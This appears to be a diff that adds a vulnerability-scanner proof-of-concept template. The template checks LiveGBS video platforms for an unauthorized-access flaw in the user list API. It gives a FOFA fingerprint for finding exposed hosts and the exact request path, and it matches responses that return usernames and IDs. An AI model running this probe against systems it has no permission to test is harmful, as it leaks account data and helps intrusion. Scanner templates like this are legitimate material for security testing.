@@ -1,0 +1,16 @@
+id: poc-yaml-livegbs-list-unauthorized-access
+info:
+  name: LiveGBS list 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: livegbs
+  fofa: icon_hash="-206100324"
+requests:
+- method: GET
+  path: /api/v1/user/list?q=&start=&limit=10&enable=&sort=CreatedAt&order=desc
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Username\\\":\") &&\ncontains(body,\"\
+    \\\"ID\\\"\") &&\ncontains(body,\"\\\"UserList\\\":\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+variables: {}
+transport: http
